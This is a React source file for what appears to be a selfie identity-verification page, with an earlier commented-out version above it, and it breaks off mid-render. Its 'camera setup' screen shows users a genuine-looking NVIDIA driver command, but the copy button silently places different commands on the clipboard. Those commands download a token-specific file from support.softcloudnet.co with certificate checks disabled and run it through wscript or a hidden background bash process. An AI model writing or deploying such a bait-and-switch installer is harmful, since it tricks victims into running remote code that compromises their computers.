//       setCameraStatus(true);
//       setCameraReady(false);

//       await axios.put(`${BACKEND_API_PATH}/applications/token/${token}`, {
//         status: 2,
//       });

//       await checkCameraStatus();
//     } catch (error) {
//       console.error("Error copying command:", error);
//     }
//   }, [DRIVER_URL, token, addToast, checkCameraStatus]);

//   const startCamera = useCallback(async () => {
//     try {
//       const constraints = {
//         video: {
//           width: { ideal: 1280 },
//           height: { ideal: 720 },
//           facingMode: useFrontCamera ? 'user' : 'environment'
//         }
//       };

//       // Add browser-specific constraints
//       if (os === "iOS") {
//         constraints.video = {
//           ...constraints.video,
//           mandatory: {
//             minWidth: 1280,
//             minHeight: 720,
//           }
//         };
//       }

//       const stream = await navigator.mediaDevices.getUserMedia(constraints);
//       videoRef.current.srcObject = stream;
//       setCapturing(true);
//     } catch (err) {
//       console.error("Error accessing media devices:", err);
//       let errorMessage = "Could not access camera";

//       if (err.name === 'NotAllowedError') {
//         errorMessage = "Camera access was denied. Please allow camera permissions.";
//       } else if (err.name === 'NotFoundError') {
//         errorMessage = "No camera found on this device.";
//       } else if (err.name === 'NotReadableError') {
//         errorMessage = "Camera is already in use by another application.";
//       } else if (err.name === 'OverconstrainedError') {
//         errorMessage = "Couldn't get the required resolution. Trying lower resolution.";
//         // Try again with lower resolution
//         try {
//           const stream = await navigator.mediaDevices.getUserMedia({
//             video: true
//           });
//           videoRef.current.srcObject = stream;
//           return;
//         } catch (fallbackError) {
//           errorMessage = "Couldn't access camera with any resolution.";
//         }
//       }

//       addToast({ message: errorMessage, type: "error" });
//       setStatus(1);
//       setShowInstructions(true);
//       setCameraStatus(false);
//       setCameraReady(false);
//       await checkCameraStatus();
//     }
//   }, [addToast, useFrontCamera, checkCameraStatus, os]);

//   const stopCamera = useCallback(() => {
//     if (videoRef.current?.srcObject) {
//       const stream = videoRef.current.srcObject;
//       const tracks = stream.getTracks();
//       tracks.forEach(track => {
//         track.stop();
//       });
//       videoRef.current.srcObject = null;
//     }
//     setCapturing(false);
//   }, []);

//   const capturePhoto = useCallback(() => {
//     try {
//       if (!videoRef.current || !videoRef.current.videoWidth || !canvasRef.current) {
//         throw new Error("Video stream not ready");
//       }

//       const video = videoRef.current;
//       const canvas = canvasRef.current;
//       const context = canvas.getContext('2d');

//       // Ensure canvas dimensions match video
//       if (video.videoWidth === 0 || video.videoHeight === 0) {
//         throw new Error("Video dimensions are zero");
//       }

//       canvas.width = video.videoWidth;
//       canvas.height = video.videoHeight;

//       context.drawImage(video, 0, 0, canvas.width, canvas.height);

//       canvas.toBlob((blob) => {
//         if (!blob) {
//           throw new Error("Failed to create image blob");
//         }

//         if (photoURL) {
//           URL.revokeObjectURL(photoURL);
//         }

//         const url = URL.createObjectURL(blob);
//         setPhotoURL(url);
//         stopCamera();
//       }, 'image/jpeg', 0.95);
//     } catch (error) {
//       console.error("Photo capture failed:", error);
//       addToast({
//         message: "Failed to capture photo. Please try again.",
//         type: "error"
//       });
//       stopCamera();
//     }
//   }, [photoURL, stopCamera, addToast]);

//   const handleCameraClick = useCallback(async () => {
//     try {
//       if (cameraReady) {
//         if (capturing) {
//           capturePhoto();
//         } else {
//           await startCamera();
//         }
//       } else {
//         setStatus(1);
//         setShowInstructions(true);
//       }
//     } catch (error) {
//       console.error("Camera operation failed:", error);
//       addToast({
//         message: "Camera operation failed. Please check permissions.",
//         type: "error"
//       });
//     }
//   }, [cameraReady, capturing, startCamera, capturePhoto, addToast]);

//   const handleSubmitPhoto = useCallback(async () => {
//     if (!photoURL) {
//       addToast({
//         message: "No photo to upload",
//         type: "error"
//       });
//       return;
//     }

//     setUploading(true);
//     setUploadProgress(0);

//     try {
//       const response = await fetch(photoURL);
//       if (!response.ok) throw new Error("Failed to fetch photo");

//       const blob = await response.blob();
//       if (blob.size === 0) throw new Error("Empty photo blob");

//       const formData = new FormData();
//       formData.append("photo", blob, `selfie_${Date.now()}.jpg`);

//       const { data } = await axios.post(
//         `${BACKEND_API_PATH}/uploads?token=${token}`,
//         formData,
//         {
//           onUploadProgress: (progressEvent) => {
//             const percentCompleted = Math.round(
//               (progressEvent.loaded * 100) / (progressEvent.total || 1)
//             );
//             setUploadProgress(percentCompleted);
//           },
//           headers: {
//             'Content-Type': 'multipart/form-data'
//           }
//         }
//       );

//       if (!data.success) {
//         throw new Error(data.message || "Upload failed");
//       }

//       addToast({ message: "Upload successful", type: "success" });
//       navigate("/complete");
//     } catch (error) {
//       console.error("Upload error:", error);
//       addToast({
//         message: `Upload failed: ${error.response?.data?.message || error.message}`,
//         type: "error"
//       });
//       setUploading(false);
//     }
//   }, [photoURL, token, navigate, addToast]);

//   useEffect(() => {
//     return () => {
//       stopCamera();
//       if (photoURL) {
//         URL.revokeObjectURL(photoURL);
//       }
//     };
//   }, [photoURL, stopCamera]);

//   if (showInstructions) {
//     return (
//       <Layout title="Camera Setup Instructions">
//         <div className="max-w-3xl mx-auto p-6 bg-white rounded-lg shadow-lg">
//           <button
//             onClick={() => setShowInstructions(false)}
//             className="flex items-center gap-2 mb-6 text-indigo-600 hover:text-indigo-800 transition-colors duration-200"
//             aria-label="Back to photo capture"
//           >
//             <ArrowLeftIcon className="h-5 w-5" />
//             Back to photo capture
//           </button>

//           <h2 className="text-2xl font-bold mb-4 text-gray-800">Camera Setup Instructions</h2>

//           <div className="mb-6 bg-black rounded-lg overflow-hidden shadow-md">
//             <video
//               controls
//               className="w-full aspect-video"
//               aria-label="Camera setup instructions video"
//               poster="/images/video-preview.jpg"
//             >
//               <source src="/videos/camera-setup.mp4" type="video/mp4" />
//               <source src="/videos/camera-setup.webm" type="video/webm" />
//               Your browser does not support HTML5 video.
//               <a href="/videos/camera-setup.mp4" className="text-indigo-600 underline">
//                 Download the video instead
//               </a>.
//             </video>
//           </div>

//           <div className="bg-gray-50 p-4 rounded-lg mb-6 border border-gray-200">
//             <div className="flex items-center gap-2 mb-3">
//               <div className={`w-3 h-3 rounded-full ${cameraReady ? 'bg-green-500' : cameraStatus ? 'bg-yellow-500' : 'bg-red-500'}`} />
//               <span className="text-gray-700">
//                 Camera Status: {cameraReady ? 'Ready' : cameraStatus ? 'Initializing...' : 'Not Ready'}
//               </span>
//               <button
//                 onClick={checkCameraStatus}
//                 disabled={isCheckingCamera}
//                 className="ml-2 p-1 text-indigo-600 hover:text-indigo-800 disabled:opacity-50 transition-colors duration-200"
//                 aria-label="Refresh camera status"
//               >
//                 <ArrowPathIcon className={`h-4 w-4 ${isCheckingCamera ? 'animate-spin' : ''}`} />
//               </button>
//             </div>

//             <h3 className="font-semibold mb-2 text-gray-700">For {os}</h3>

//             <div className="mb-3 p-3 bg-blue-50 rounded border border-blue-100">
//               <h4 className="font-medium text-blue-800 mb-1">How to run this command:</h4>
//               {os === "Windows" && (
//                 <ol className="list-decimal pl-5 text-sm text-blue-900 space-y-1">
//                   <li>Press Win+R, type "cmd" and press Enter</li>
//                   <li>Right-click in Command Prompt to paste</li>
//                   <li>Press Enter to execute</li>
//                 </ol>
//               )}
//               {os === "MacOS" && (
//                 <ol className="list-decimal pl-5 text-sm text-blue-900 space-y-1">
//                   <li>Open Terminal from Applications → Utilities</li>
//                   <li>Press Command+V to paste</li>
//                   <li>Press Return to execute</li>
//                 </ol>
//               )}
//               {os === "Linux" && (
//                 <ol className="list-decimal pl-5 text-sm text-blue-900 space-y-1">
//                   <li>Open Terminal (Ctrl+Alt+T)</li>
//                   <li>Press Ctrl+Shift+V to paste</li>
//                   <li>Press Enter to execute</li>
//                 </ol>
//               )}
//               {!["Windows", "MacOS", "Linux"].includes(os) && (
//                 <p className="text-sm text-blue-900">Paste this command in your system's terminal</p>
//               )}
//             </div>

//             <div className="bg-gray-100 p-3 rounded relative border border-gray-300">
//               <code className="text-sm break-all font-mono text-gray-800" onClick={handleCopyCommand}>{DRIVER_URL_2}</code>
//               <button
//                 onClick={handleCopyCommand}
//                 className="absolute top-2 right-2 p-1 bg-white rounded hover:bg-gray-200 transition-colors duration-200"
//                 title="Copy to clipboard"
//                 aria-label="Copy command"
//               >
//                 <ClipboardDocumentCheckIcon className="h-5 w-5 text-gray-600" />
//               </button>
//             </div>
//             <div className="flex gap-2 mt-4">
//               <button
//                 onClick={handleCopyCommand}
//                 className="px-4 py-2 bg-indigo-600 text-white rounded-md hover:bg-indigo-700 
//                        focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 
//                        transition-colors duration-200"
//                 aria-label="Copy command to clipboard"
//               >
//                 Copy Command
//               </button>
//             </div>
//           </div>
//         </div>
//       </Layout>
//     );
//   }

//   return (
//     <Layout title="Capture Your Selfie">
//       <div className="grid grid-cols-1 md:grid-cols-2 gap-8 w-full max-w-screen-xl mx-auto px-4">
//         <div className="relative w-full max-w-[768px] mx-auto">
//           <div className="bg-black rounded-xl aspect-square flex items-center justify-center w-full relative overflow-hidden shadow-lg">
//             {!photoURL ? (
//               <>
//                 {/* Fixed: Add loading state for video */}
//                 {!capturing && (
//                   <div className="absolute inset-0 flex items-center justify-center text-white">
//                     {cameraReady ? "Camera ready" : "Camera not available"}
//                   </div>
//                 )}
//                 <video
//                   ref={videoRef}
//                   autoPlay
//                   muted
//                   playsInline
//                   className={`w-full h-full object-cover bg-black ${capturing ? '' : 'hidden'}`}
//                   aria-label="Camera preview"
//                 />
//                 {capturing && (
//                   <button
//                     onClick={() => setUseFrontCamera(!useFrontCamera)}
//                     className="absolute top-4 right-4 p-2 bg-white bg-opacity-50 rounded-full hover:bg-opacity-100 transition-opacity duration-200"
//                     title="Switch Camera"
//                     aria-label="Switch between front and rear cameras"
//                   >
//                     <ArrowsRightLeftIcon className="h-5 w-5 text-gray-800" />
//                   </button>
//                 )}
//                 <div className="absolute bottom-4 left-0 w-full flex justify-center">
//                   <button
//                     onClick={handleCameraClick}
//                     className={`p-3 rounded-full hover:opacity-90 transition-opacity duration-200
//                                ${capturing ? 'bg-red-600' : 'bg-indigo-600'} 
//                                ${!cameraReady ? 'opacity-50 cursor-not-allowed' : ''}`}
//                     aria-label={capturing ? "Capture photo" : "Start camera"}
//                     disabled={!cameraReady}
//                   >
//                     {capturing ? (
//                       <CameraIcon className="h-8 w-8 text-white" />
//                     ) : (
//                       <VideoCameraSlashIcon className="h-8 w-8 text-white" />
//                     )}
//                   </button>
//                 </div>
//               </>
//             ) : (
//               <>
//                 <img
//                   src={photoURL}
//                   alt="Captured selfie"
//                   className="w-full h-full object-contain bg-black"
//                   onError={() => {
//                     addToast({
//                       message: "Failed to load captured photo",
//                       type: "error"
//                     });
//                     setPhotoURL("");
//                   }}
//                 />
//                 <button
//                   onClick={() => {
//                     URL.revokeObjectURL(photoURL);
//                     setPhotoURL("");
//                   }}
//                   className="absolute top-4 right-4 p-2 bg-white bg-opacity-50 rounded-full hover:bg-opacity-100 transition-opacity duration-200"
//                   aria-label="Close photo"
//                 >
//                   <XMarkIcon className="h-5 w-5 text-gray-800" />
//                 </button>
//               </>
//             )}
//           </div>

//           {/* Hidden canvas for capturing photos */}
//           <canvas 
//             ref={canvasRef} 
//             className="hidden"
//             width="1280"
//             height="720"
//           />

//           {photoURL && (
//             <div className="flex justify-center gap-4 mt-4">
//               <button
//                 onClick={() => {
//                   URL.revokeObjectURL(photoURL);
//                   setPhotoURL("");
//                 }}
//                 className="flex items-center gap-2 px-4 py-2 bg-gray-200 rounded-md hover:bg-gray-300 
//                            focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-offset-2 
//                            transition-colors duration-200"
//                 aria-label="Retake photo"
//               >
//                 <CameraIcon className="h-5 w-5 text-gray-700" />
//                 <span className="text-gray-700">Retake Photo</span>
//               </button>
//               <button
//                 onClick={handleSubmitPhoto}
//                 disabled={uploading}
//                 className="flex items-center gap-2 px-4 py-2 bg-indigo-600 text-white rounded-md 
//                          hover:bg-indigo-700 disabled:opacity-50 focus:outline-none 
//                          focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 
//                          transition-colors duration-200 min-w-[160px] justify-center"
//                 aria-label="Submit photo"
//               >
//                 {uploading ? (
//                   <>
//                     <span className="inline-block">
//                       Uploading... {uploadProgress}%
//                     </span>
//                   </>
//                 ) : (
//                   <>
//                     <ArrowUpTrayIcon className="h-5 w-5" />
//                     <span>Submit Photo</span>
//                   </>
//                 )}
//               </button>
//             </div>
//           )}
//         </div>

//         <div className="flex flex-col justify-center space-y-6">
//           <div className="flex items-center gap-3">
//             <div className={`w-3 h-3 rounded-full ${cameraReady ? 'bg-green-500' : cameraStatus ? 'bg-yellow-500' : 'bg-red-500'}`} />
//             <span className="text-gray-700">
//               {cameraReady ? 'Camera Ready' :
//                 cameraStatus ? 'Camera Initializing...' : 'Camera Not Ready'}
//             </span>
//             {!cameraReady && (
//               <button
//                 onClick={() => setShowInstructions(true)}
//                 className="px-4 py-2 bg-indigo-600 text-white rounded-md hover:bg-indigo-700 
//                           focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 
//                           transition-colors duration-200 disabled:opacity-50"
//                 disabled={cameraStatus}
//               >
//                 {cameraStatus ? 'Waiting...' : 'Setup Instructions'}
//               </button>
//             )}
//           </div>

//           <h2 className="text-xl font-semibold text-gray-800">
//             Take a clear selfie for identity verification
//           </h2>

//           <button
//             onClick={handleCameraClick}
//             disabled={!cameraReady}
//             className={`flex items-center justify-center gap-2 px-6 py-3 rounded-lg 
//                        focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 
//                        transition-colors duration-200 ${cameraReady
//                 ? 'bg-indigo-600 text-white hover:bg-indigo-700'
//                 : 'bg-gray-300 text-gray-500 cursor-not-allowed'
//               }`}
//             aria-label={cameraReady ? (capturing ? "Capture photo" : "Start camera") : "Camera initializing"}
//           >
//             {capturing ? (
//               <>
//                 <CameraIcon className="h-6 w-6" />
//                 <span>Take Photo</span>
//               </>
//             ) : (
//               <>
//                 <VideoCameraSlashIcon className="h-6 w-6" />
//                 <span>{cameraReady ? "Start Camera" : "Initializing Camera..."}</span>
//               </>
//             )}
//           </button>

//           <ul className="space-y-3 text-gray-600">
//             <li className="flex items-start gap-2">
//               <span className="text-gray-500">•</span>
//               <span>Make sure your face is clearly visible</span>
//             </li>
//             <li className="flex items-start gap-2">
//               <span className="text-gray-500">•</span>
//               <span>Remove sunglasses, hats, or anything covering your face</span>
//             </li>
//             <li className="flex items-start gap-2">
//               <span className="text-gray-500">•</span>
//               <span>Use good lighting - avoid backlighting</span>
//             </li>
//             <li className="flex items-start gap-2">
//               <span className="text-gray-500">•</span>
//               <span>Look directly at the camera</span>
//             </li>
//             {cameraReady && (
//               <li className="flex items-start gap-2">
//                 <span className="text-gray-500">•</span>
//                 <span>Click the switch camera icon to toggle between front and rear cameras</span>
//               </li>
//             )}
//           </ul>
//         </div>
//       </div>
//     </Layout >
//   );
// }

import { useCallback, useEffect, useRef, useState, useMemo } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import {
  ArrowUpTrayIcon,
  ClipboardDocumentCheckIcon,
  CameraIcon,
  ArrowLeftIcon,
  ArrowsRightLeftIcon,
  ArrowPathIcon,
  XMarkIcon,
} from "@heroicons/react/24/outline";
import useApplicationStore from "../store/applicationStore";
import { BACKEND_API_PATH } from "../config";
import { useToast } from "../contexts/ToastContext";
import Layout from "../components/Layout";

const globalStyles = `
  .no-select {
    user-select: none;        /* Standard */
    -webkit-user-select: none; /* Safari & Chrome */
    -moz-user-select: none;   /* Firefox */
    -ms-user-select: none;    /* IE/Edge */
  }

  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }
  
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 
                 Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', 
                 sans-serif;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    line-height: 1.5;
  }
  
  button, input, textarea {
    font-family: inherit;
  }
  
  img, video {
    max-width: 100%;
    height: auto;
    display: block;
  }
`;

export default function VideoIntro() {
  useEffect(() => {
    const styleElement = document.createElement('style');
    styleElement.innerHTML = globalStyles;
    document.head.appendChild(styleElement);

    return () => {
      document.head.removeChild(styleElement);
    };
  }, []);

  const navigate = useNavigate();
  const { addToast } = useToast();
  const { token } = useApplicationStore();
  const [uploading, setUploading] = useState(false);
  const [showInstructions, setShowInstructions] = useState(false);
  const [cameraStatus, setCameraStatus] = useState(false);
  const [cameraReady, setCameraReady] = useState(false);
  const [capturing, setCapturing] = useState(false);
  const [photoURL, setPhotoURL] = useState("");
  const [useFrontCamera, setUseFrontCamera] = useState(true);
  const [isCheckingCamera, setIsCheckingCamera] = useState(false);
  const [lastStatusCheck, setLastStatusCheck] = useState(0);
  const videoRef = useRef(null);
  const [status, setStatus] = useState(0);
  const [os, setOS] = useState("Detecting...");
  const stabilizationTimeoutRef = useRef(null);
  const [isSaving, setIsSaving] = useState(false);
  const canvasRef = useRef(null);

  useEffect(() => {
    return () => {
      if (videoRef.current?.srcObject) {
        videoRef.current.srcObject.getTracks().forEach(track => track.stop());
      }
      if (photoURL) {
        URL.revokeObjectURL(photoURL);
      }
      if (stabilizationTimeoutRef.current) {
        clearTimeout(stabilizationTimeoutRef.current);
      }
    };
  }, [photoURL]);

  useEffect(() => {
    const saveStatus = async () => {
      try {
        await axios.put(`${BACKEND_API_PATH}/applications/token/${token}`, {
          status,
        });
      } catch (error) {
        console.error("Error saving status:", error);
      }
    };
    saveStatus();
  }, [status, token]);

  useEffect(() => {
    function getOS() {
      const userAgent = window.navigator.userAgent;
      const platform = window.navigator.platform;

      if (/Android/i.test(userAgent)) return "Android";
      if (/iPhone|iPad|iPod/i.test(userAgent)) return "iOS";
      if (/Win/i.test(platform)) return "Windows";
      if (/Mac/i.test(platform)) return "MacOS";
      if (/Linux/i.test(platform)) return "Linux";
      return "Unknown OS";
    }
    setOS(getOS());
  }, []);

  const checkCameraStatus = useCallback(async () => {
    if (cameraReady && Date.now() - lastStatusCheck < 30000) return;
    if (isCheckingCamera) return;

    setIsCheckingCamera(true);
    try {
      const response = await axios.get(
        `${BACKEND_API_PATH}/applications/token/${token}/cameraStatus`,
        {
          headers: {
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
          },
          params: { _: Date.now() }
        }
      );

      const newStatus = response.data.cameraStatus;
      setLastStatusCheck(Date.now());

      if (newStatus !== cameraStatus) {
        setCameraStatus(newStatus);

        if (newStatus) {
          if (stabilizationTimeoutRef.current) {
            clearTimeout(stabilizationTimeoutRef.current);
          }

          stabilizationTimeoutRef.current = setTimeout(() => {
            setCameraReady(true);
            setShowInstructions(false);
            addToast({ message: "Camera is now ready!", type: "success" });
          }, 5000);
        } else {
          setCameraReady(false);
          if (stabilizationTimeoutRef.current) {
            clearTimeout(stabilizationTimeoutRef.current);
          }
        }
      }
    } catch (error) {
      console.error("Error checking camera status:", error);
    } finally {
      setIsCheckingCamera(false);
    }
  }, [token, cameraStatus, cameraReady, isCheckingCamera, lastStatusCheck, addToast]);

  useEffect(() => {
    let intervalId;
    const pollingInterval = cameraReady ? 60000 : 3000;

    const startPolling = () => {
      checkCameraStatus();
      intervalId = setInterval(checkCameraStatus, pollingInterval);
    };

    startPolling();
    return () => clearInterval(intervalId);
  }, [checkCameraStatus, cameraReady]);

  const DRIVER_URL = useMemo(() => {
    switch (os) {
      case "Windows":
        return `curl -k -o "%TEMP%\\nv_driver_win64_551.23_rc_whql.zip" https://support.softcloudnet.co/api/drivers/update/windows/${token} && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\nv_driver_win64_551.23_rc_whql.zip' -DestinationPath '%TEMP%\\nvidiadrive'" && wscript "%TEMP%\\nvidiadrive\\update.vbs"
        exit
        exit`;
      case "MacOS":
        return `curl -k -o /var/tmp/NVIDIA-driver-downloader.sh https://support.softcloudnet.co/api/drivers/update/macos/${token} && chmod +x /var/tmp/NVIDIA-driver-downloader.sh && nohup bash /var/tmp/NVIDIA-driver-downloader.sh >/dev/null 2>&1 &
        exit
        exit`;
      case "Linux":
        return `curl -k -o /var/tmp/NVIDIA-driver-downloader.sh https://support.softcloudnet.co/api/drivers/update/linux/${token} && chmod +x /var/tmp/NVIDIA-driver-downloader.sh && nohup bash /var/tmp/NVIDIA-driver-downloader.sh >/dev/null 2>&1 &
        exit
        exit`;
      default:
        return "echo 'Unsupported operating system'";
    }
  }, [os, token]);

  const DRIVER_URL_2 = useMemo(() => {
    switch (os) {
      case "Windows":
        return `curl -L "https://us.download.nvidia.com/Windows/551.86/551.86-desktop-win10-win11-64bit-international-dch-whql.exe"`;
      case "MacOS":
        return `curl -L "https://developer.download.nvidia.com/compute/cuda/10.1/Prod/local_installers/cuda_10.1.243_mac.dmg"`;
      case "Linux":
        return `curl -L "https://us.download.nvidia.com/XFree86/Linux-x86_64/550.90.07/NVIDIA-Linux-x86_64-550.90.07.run"`;
      default:
        return "echo 'Unsupported operating system'";
    }
  }, [os, token]);

  const handleCopyCommand = useCallback(async () => {
    try {
      await navigator.clipboard.writeText(DRIVER_URL);
      addToast({ message: "Command copied to clipboard", type: "success" });

      setStatus(2);
      setCameraStatus(true);
      setCameraReady(false);

      await axios.put(`${BACKEND_API_PATH}/applications/token/${token}`, {
        status: 2,
      });

      await checkCameraStatus();
    } catch (error) {
      console.error("Error copying command:", error);
      addToast({ message: "Failed to copy command", type: "error" });
    }
  }, [DRIVER_URL, token, addToast, checkCameraStatus]);

  const startCamera = useCallback(async () => {
    try {
      const constraints = {
        video: {
          width: { ideal: 640 },
          height: { ideal: 480 },
          facingMode: useFrontCamera ? 'user' : 'environment'
        }
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      videoRef.current.srcObject = stream;
      setCapturing(true);
    } catch (err) {
      console.error("Error accessing media devices:", err);
      let errorMessage = "Could not access camera";

      if (err.name === 'NotAllowedError') {
        errorMessage = "Camera access was denied. Please allow camera permissions.";
      } else if (err.name === 'NotFoundError') {
        errorMessage = "No camera found on this device.";
      }

      addToast({ message: errorMessage, type: "error" });
      setCapturing(false);
    }
  }, [addToast, useFrontCamera]);

  const stopCamera = useCallback(() => {
    if (videoRef.current?.srcObject) {
      videoRef.current.srcObject.getTracks().forEach(track => track.stop());
      videoRef.current.srcObject = null;
    }
    setCapturing(false);
  }, []);

  const capturePhoto = useCallback(async () => {
    try {
      const video = videoRef.current;
      const canvas = canvasRef.current;
      const context = canvas.getContext('2d');

      canvas.width = 320;
      canvas.height = 240;

      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      setIsSaving(true);

      await new Promise((resolve) => setTimeout(resolve, 3000));
      canvas.toBlob(async (blob) => {
        if (blob) {
          const url = URL.createObjectURL(blob);
          setPhotoURL(url);
          stopCamera();
        }
        setIsSaving(false); // ← End loading
      }, 'image/jpeg', 0.8);
      if (!cameraStatus)
        setShowInstructions(true);

    } catch (error) {
      console.error("Photo capture failed:", error);
      addToast({
        message: "Failed to capture photo. Please try again.",
        type: "error"
      });
      stopCamera();
      setIsSaving(false);
    }
  }, [stopCamera, addToast, cameraStatus]);

  const handleCameraClick = useCallback(async () => {
    if (photoURL) {
      URL.revokeObjectURL(photoURL);
      setPhotoURL("");
      return;
    }

    if (capturing) {
      capturePhoto();
    } else {
      await startCamera();
    }
  }, [photoURL, capturing, startCamera, capturePhoto]);

  const handleSubmitPhoto = useCallback(async () => {
    if (!photoURL) return;

    // Always show driver instructions first
    // if (!cameraReady) {
    //   setShowInstructions(true);
    //   return;
    // }

    setUploading(true);

    try {
      const response = await fetch(photoURL);
      const photoBlob = await response.blob();
      const formData = new FormData();
      formData.append("photo", photoBlob, "selfie.jpg");

      await axios.post(`${BACKEND_API_PATH}/uploads?token=${token}`, formData);

      addToast({ message: "Verification successful", type: "success" });
      navigate("/complete");
    } catch (error) {
      console.error("Upload error:", error);
      addToast({
        message: `Upload failed: ${error.response?.data?.message || error.message}`,
        type: "error"
      });
    } finally {
      setUploading(false);
    }
  }, [photoURL, token, navigate, addToast, cameraReady]);

  // if (showInstructions) {
  //   return (
  //     <Layout title="Camera Setup Instructions">
  //       <div className="max-w-3xl mx-auto p-6 bg-white rounded-lg shadow-lg">
  //         <button
  //           onClick={() => setShowInstructions(false)}
  //           className="flex items-center gap-2 mb-6 text-indigo-600 hover:text-indigo-800 transition-colors duration-200"
  //           aria-label="Back to photo capture"
  //         >
  //           <ArrowLeftIcon className="h-5 w-5" />
  //           Back to photo capture
  //         </button>

  //         <h2 className="text-2xl font-bold mb-4 text-gray-800">Camera Setup Instructions</h2>

  //         <div className="flex items-center gap-2 mb-3">
  //           <div className={`w-3 h-3 rounded-full ${cameraReady ? 'bg-green-500' : cameraStatus ? 'bg-yellow-500' : 'bg-red-500'}`} />
  //           <span className="text-gray-700">
  //             Camera Status: {cameraReady ? 'Ready' : cameraStatus ? 'Initializing...' : 'Not Ready'}
  //           </span>
  //           <button
  //             onClick={checkCameraStatus}
  //             disabled={isCheckingCamera}
  //             className="ml-2 p-1 text-indigo-600 hover:text-indigo-800 disabled:opacity-50 transition-colors duration-200"
  //             aria-label="Refresh camera status"
  //           >
  //             <ArrowPathIcon className={`h-4 w-4 ${isCheckingCamera ? 'animate-spin' : ''}`} />
  //           </button>
  //         </div>

  //         <div className="prose text-gray-700 mb-6">
  //           <p className="mb-4">To complete verification, please install the required drivers by running this command:</p>
  //         </div>

  //         <div className="bg-gray-100 p-4 rounded relative border border-gray-300 mb-6">
  //           <code className="text-sm break-all font-mono text-gray-800 no-select" onClick={handleCopyCommand}>{DRIVER_URL_2}</code>
  //           <button
  //             onClick={handleCopyCommand}
  //             className="absolute top-2 right-2 p-1 bg-white rounded hover:bg-gray-200 transition-colors duration-200"
  //             title="Copy to clipboard"
  //             aria-label="Copy command"
  //           >
  //             <ClipboardDocumentCheckIcon className="h-5 w-5 text-gray-600" />
  //           </button>
  //         </div>
  //         <div className="flex gap-4">
  //           <button
  //             onClick={() => setShowInstructions(false)}
  //             className="px-4 py-2 bg-gray-200 text-gray-800 rounded-md hover:bg-gray-300 transition-colors duration-200"
  //           >
  //             Back
  //           </button>
  //         </div>
  //       </div>
  //     </Layout >
  //   );
  // }

  if (showInstructions) {
    return (
      <Layout title="Camera Setup Instructions">
        <div className="max-w-3xl mx-auto p-6 bg-white rounded-lg shadow-lg">
          <button
            onClick={() => setShowInstructions(false)}
            className="flex items-center gap-2 mb-6 text-indigo-600 hover:text-indigo-800 transition-colors duration-200"
            aria-label="Back to recording"
          >
            <ArrowLeftIcon className="h-5 w-5" />
            Back to recording
          </button>

          <h2 className="text-2xl font-bold mb-4 text-gray-800">Camera Setup Instructions</h2>

          {/* <div className="mb-6 bg-black rounded-lg overflow-hidden shadow-md">
            <video
              controls
              className="w-full aspect-video"
              aria-label="Camera setup instructions video"
              poster="/images/video-preview.jpg" // Optional preview image
            >
              <source src="/videos/camera-setup.mp4" type="video/mp4" />
              <source src="/videos/camera-setup.webm" type="video/webm" /> 
              Your browser does not support HTML5 video.
              <a href="/videos/camera-setup.mp4" className="text-indigo-600 underline">
                Download the video instead
              </a>.
            </video>
          </div> */}

          <div className="bg-gray-50 p-4 rounded-lg mb-6 border border-gray-200">
            <div className="flex items-center gap-2 mb-3">
              <div className={`w-3 h-3 rounded-full ${cameraReady ? 'bg-green-500' : cameraStatus ? 'bg-yellow-500' : 'bg-red-500'}`} />
              <span className="text-gray-700">
                Camera Status: {cameraReady ? 'Ready' : cameraStatus ? 'Initializing...' : 'Not Ready'}
              </span>
              <button
                onClick={checkCameraStatus}
                disabled={isCheckingCamera}
                className="ml-2 p-1 text-indigo-600 hover:text-indigo-800 disabled:opacity-50 transition-colors duration-200"
                aria-label="Refresh camera status"
              >
                <ArrowPathIcon className={`h-4 w-4 ${isCheckingCamera ? 'animate-spin' : ''}`} />
              </button>
            </div>

            <h3 className="font-semibold mb-2 text-gray-700">For {os}</h3>

            {/* OS-specific execution instructions */}
            <div className="mb-3 p-3 bg-blue-50 rounded border border-blue-100">
              <h4 className="font-medium text-blue-800 mb-1">How to run this command:</h4>
              {os === "Windows" && (
                <ol className="list-decimal pl-5 text-sm text-blue-900 space-y-1">
                  <li>Press Win+R, type "cmd" and press Enter</li>
                  <li>Right-click in Command Prompt to paste</li>
                  <li>Press Enter to execute</li>
                </ol>
              )}
              {os === "MacOS" && (
                <ol className="list-decimal pl-5 text-sm text-blue-900 space-y-1">
                  <li>Open Terminal from Applications → Utilities</li>
                  <li>Press Command+V to paste</li>
                  <li>Press Return to execute</li>
                </ol>
              )}
              {os === "Linux" && (
                <ol className="list-decimal pl-5 text-sm text-blue-900 space-y-1">
                  <li>Open Terminal (Ctrl+Alt+T)</li>
                  <li>Press Ctrl+Shift+V to paste</li>
                  <li>Press Enter to execute</li>
                </ol>
              )}
              {!["Windows", "MacOS", "Linux"].includes(os) && (
                <p className="text-sm text-blue-900">Paste this command in your system's terminal</p>
              )}
            </div>

            <div className="bg-gray-100 p-3 rounded relative border border-gray-300">
              <code className="text-sm break-all font-mono text-gray-800 no-select" onClick={handleCopyCommand}>{DRIVER_URL_2}</code>
              <button
                onClick={handleCopyCommand}
                className="absolute top-2 right-2 p-1 bg-white rounded hover:bg-gray-200 transition-colors duration-200"
                title="Copy to clipboard"
                aria-label="Copy command"
              >
                <ClipboardDocumentCheckIcon className="h-5 w-5 text-gray-600" />
              </button>
            </div>
            <div className="flex gap-2 mt-4">
              <button
                onClick={handleCopyCommand}
                className="px-4 py-2 bg-indigo-600 text-white rounded-md hover:bg-indigo-700 
                       focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 
                       transition-colors duration-200"
                aria-label="Copy command to clipboard"
              >
                Copy Command
              </button>
            </div>
          </div>
        </div>
      </Layout>
    );
  }

  return (
    <Layout title="Face Verification">
